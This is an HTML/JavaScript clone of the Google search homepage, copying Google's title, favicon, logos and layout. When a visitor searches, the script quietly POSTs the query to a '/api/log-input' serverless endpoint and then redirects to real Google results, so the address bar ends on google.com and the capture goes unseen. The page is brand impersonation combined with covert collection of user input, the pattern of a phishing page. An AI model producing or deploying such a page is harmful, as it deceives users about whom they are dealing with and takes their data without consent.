<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --background-color: #ffffff;
            --text-color: #202124;
            --secondary-text: #5f6368;
            --border-color: #dfe1e5;
            --search-box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
            --button-bg: #f8f9fa;
            --button-text: #3c4043;
            --button-hover-bg: #f0f0f0;
            --button-border: #f8f9fa;
            --header-border: #ebebeb;
            --link-color: #1a0dab;
            --visited-link: #681da8;
        }

        [data-theme="dark"] {
            --background-color: #202124;
            --text-color: #e8eaed;
            --secondary-text: #9aa0a6;
            --border-color: #5f6368;
            --search-box-shadow: 0 1px 6px rgba(0, 0, 0, 0.28);
            --button-bg: #303134;
            --button-text: #e8eaed;
            --button-hover-bg: #3c4043;
            --button-border: #303134;
            --header-border: #3c4043;
            --link-color: #8ab4f8;
            --visited-link: #c58af9;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: var(--background-color);
            color: var(--text-color);
            transition: background-color 0.3s, color 0.3s;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex;
            justify-content: flex-end;
            padding: 6px 20px;
            align-items: center;
            gap: 15px;
            font-size: 13px;
        }

        .header-link {
            color: var(--text-color);
            text-decoration: none;
        }

        .header-link:hover {
            text-decoration: underline;
        }

        .theme-toggle {
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .theme-toggle:hover {
            background-color: rgba(0, 0, 0, 0.1);
        }

        [data-theme="dark"] .theme-toggle:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .theme-icon {
            width: 20px;
            height: 20px;
            fill: var(--text-color);
        }

        .apps-icon {
            width: 24px;
            height: 24px;
            fill: var(--text-color);
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            margin-top: -100px;
        }

        .google-logo {
            width: 272px;
            height: 92px;
            margin-bottom: 26px;
        }

        .search-container {
            width: 100%;
            max-width: 584px;
            position: relative;
        }

        .search-box {
            display: flex;
            align-items: center;
            border: 1px solid var(--border-color);
            border-radius: 24px;
            padding: 8px 14px;
            width: 100%;
            box-shadow: var(--search-box-shadow);
            transition: box-shadow 0.3s;
            background-color: var(--background-color);
        }

        .search-box:hover {
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .search-input {
            flex-grow: 1;
            border: none;
            outline: none;
            padding: 8px 10px;
            font-size: 16px;
            background: transparent;
            color: var(--text-color);
        }

        .search-input::placeholder {
            color: var(--secondary-text);
        }

        .search-icon {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            fill: var(--secondary-text);
        }

        .search-buttons {
            display: flex;
            justify-content: center;
            gap: 11px;
            margin-top: 26px;
        }

        .search-button {
            background-color: var(--button-bg);
            border: 1px solid var(--button-border);
            border-radius: 4px;
            color: var(--button-text);
            font-size: 14px;
            padding: 8px 16px;
            cursor: pointer;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .search-button:hover {
            border: 1px solid var(--border-color);
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
        }

        .footer {
            background-color: var(--background-color);
            border-top: 1px solid var(--border-color);
            padding: 15px 20px;
            font-size: 14px;
            color: var(--secondary-text);
        }

        .footer-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }

        .footer-links {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .footer-link {
            color: var(--secondary-text);
            text-decoration: none;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .google-logo {
                width: 200px;
                height: auto;
            }
            
            .search-box {
                padding: 6px 12px;
            }
            
            .search-input {
                font-size: 14px;
            }
            
            .search-buttons {
                flex-direction: column;
                width: 100%;
            }
            
            .search-button {
                width: 100%;
            }
        }

        @media (max-width: 480px) {
            .header {
                padding: 6px 10px;
            }
            
            .google-logo {
                width: 150px;
            }
            
            .footer {
                padding: 10px 15px;
            }
            
            .footer-links {
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-links">
            <a href="#" class="header-link">Gmail</a>
            <a href="#" class="header-link">Images</a>
            <button class="theme-toggle" id="themeToggle">
                <svg class="theme-icon" viewBox="0 0 24 24">
                    <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1-8.313-12.454z"></path>
                </svg>
            </button>
            <button class="theme-toggle">
                <svg class="apps-icon" viewBox="0 0 24 24">
                    <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"></path>
                </svg>
            </button>
            <button class="header-link" style="background-color: #1a73e8; color: white; border-radius: 4px; padding: 8px 15px; margin-left: 5px;">Sign in</button>
        </div>
    </div>

    <div class="main-content">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Google" class="google-logo" id="googleLogo">
        
        <div class="search-container">
            <div class="search-box">
                <svg class="search-icon" focusable="false" viewBox="0 0 24 24">
                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
                </svg>
                <input type="text" class="search-input" id="searchInput" placeholder="Search Google or type a URL" autocomplete="off">
                <svg class="search-icon" focusable="false" viewBox="0 0 24 24" style="cursor: pointer;">
                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
                </svg>
            </div>
            
            <div class="search-buttons">
                <button type="button" class="search-button" id="googleSearch">Google Search</button>
                <button type="button" class="search-button">I'm Feeling Lucky</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="#" class="footer-link">About</a>
                <a href="#" class="footer-link">Advertising</a>
                <a href="#" class="footer-link">Business</a>
                <a href="#" class="footer-link">How Search works</a>
            </div>
            <div class="footer-links">
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
                <a href="#" class="footer-link">Settings</a>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Theme Toggle Functionality
            const themeToggle = document.getElementById('themeToggle');
            const googleLogo = document.getElementById('googleLogo');
            const prefersDarkScheme = window.matchMedia('(prefers-color-scheme: dark)');
            
            // Check for saved theme preference or use system preference
            const currentTheme = localStorage.getItem('theme') || 
                                (prefersDarkScheme.matches ? 'dark' : 'light');
            
            // Apply the theme
            if (currentTheme === 'dark') {
                document.body.setAttribute('data-theme', 'dark');
                googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_dark_color_272x92dp.png';
            } else {
                document.body.removeAttribute('data-theme');
                googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png';
            }
            
            // Toggle theme on button click
            themeToggle.addEventListener('click', () => {
                const currentTheme = document.body.getAttribute('data-theme');
                
                if (currentTheme === 'dark') {
                    document.body.removeAttribute('data-theme');
                    localStorage.setItem('theme', 'light');
                    googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png';
                } else {
                    document.body.setAttribute('data-theme', 'dark');
                    localStorage.setItem('theme', 'dark');
                    googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_dark_color_272x92dp.png';
                }
            });
            
            // Search Functionality with Vercel Integration
            const searchInput = document.getElementById('searchInput');
            const googleSearch = document.getElementById('googleSearch');
            
            // Function to handle search
            async function handleSearch(query) {
                if (!query) return;
                
                // 1. Send the query to the Vercel Serverless Function for logging
                try {
                    const response = await fetch('/api/log-input', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ input: query }),
                    });

                    const data = await response.json();
                    if (response.ok) {
                        console.log('Vercel Function response:', data.message);
                    } else {
                        console.error('Error from Vercel Function:', data.message);
                    }
                } catch (error) {
                    console.error('Error sending query to Vercel Function:', error);
                }

                // 2. Redirect to Google Search
                // This will show google.com in the address bar
                window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
            }
            
            // Handle search button click
            googleSearch.addEventListener('click', () => {
                const query = searchInput.value.trim();
                if (query) {
                    handleSearch(query);
                }
            });
            
            // Handle enter key in search input
            searchInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    const query = searchInput.value.trim();
                    if (query) {
                        handleSearch(query);
                    }
                }
            });
            
            // Listen for system theme changes
            prefersDarkScheme.addListener((e) => {
                if (!localStorage.getItem('theme')) {
                    if (e.matches) {
                        document.body.setAttribute('data-theme', 'dark');
                        googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_dark_color_272x92dp.png';
                    } else {
                        document.body.removeAttribute('data-theme');
                        googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png';
                    }
                }
            });
        });
    </script>
</body>
</html>
